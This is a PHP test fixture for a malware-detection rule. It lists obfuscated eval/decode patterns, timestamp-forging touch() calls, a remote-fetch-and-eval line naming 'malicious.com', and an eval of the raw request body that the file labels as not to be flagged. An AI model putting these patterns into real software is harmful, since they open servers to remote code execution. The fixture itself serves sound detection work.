<?php declare(strict_types=1);

/**
 * Trigger script for PotentialMalwareRule testing
 * This file contains various malware patterns that the rule should detect
 */

// Test case 1: eval() with decode functions
eval(base64_decode('some_encoded_data'));
eval(gzinflate('compressed_data'));
eval(gzuncompress('compressed_data'));
eval(urldecode('url_encoded_data'));

// Test case 2: eval() with other suspicious functions
eval(curl_exec('http://malicious.com'));
eval(strrev('reversed_string'));
eval(str_rot13('rot13_encoded'));

// Test case 3: touch() with 3 arguments (file hiding)
touch('/path/to/file.txt', time(), time() + 3600);

// Test case 4: get_defined_functions() call
$functions = get_defined_functions();

// Test case 5: Function returning decode function
function malicious_decoder(): string
{
    return base64_decode('encoded_data');
}

function another_malicious_decoder(): string
{
    return gzinflate('compressed_data');
}

// Test case 6: Function with variable function call (should be flagged)
function suspicious_function(): mixed
{
    $func = 'base64_decode';
    return $func('data');
}

// Test case 7: Nested decode functions
function nested_decode(): string
{
    return base64_decode(gzinflate('nested_encoded'));
}

// Test case 8: Eval with parentheses and error suppression
eval((base64_decode('data')));
eval(@base64_decode('data'));

// Test case 9: Function with parentheses around return
function paren_decode(): string
{
    return (base64_decode('data'));
}

// Test case 10: Interactive console pattern (should NOT be flagged)
eval(file_get_contents('php://input'));

// Test case 11: Normal eval usage (should NOT be flagged)
eval('$result = 2 + 2;');

// Test case 12: Normal touch usage (should NOT be flagged)
touch('/path/to/file.txt');
touch('/path/to/file.txt', time());

// Test case 13: Normal function returning normal value (should NOT be flagged)
function normal_function(): string
{
    return 'normal_string';
}

function another_normal(): int
{
    $x = 5;
    return $x * 2;
}